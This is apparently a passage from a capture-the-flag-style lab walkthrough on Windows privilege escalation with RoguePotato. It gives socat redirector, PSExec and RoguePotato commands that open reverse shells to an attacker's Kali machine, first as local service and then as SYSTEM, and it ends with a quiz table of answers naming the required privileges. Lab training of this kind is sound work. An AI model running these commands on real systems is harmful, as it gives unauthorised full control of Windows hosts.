Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.37.130:9999
```

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

```
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

Answer the questions below

| Question                                                        | Answer                        |
| --------------------------------------------------------------- | ----------------------------- |
| Name one user privilege that allows this exploit to work.       | SeImpersonatePrivilege        |
| Name the other user privilege that allows this exploit to work. | SeAssignPrimaryTokenPrivilege |
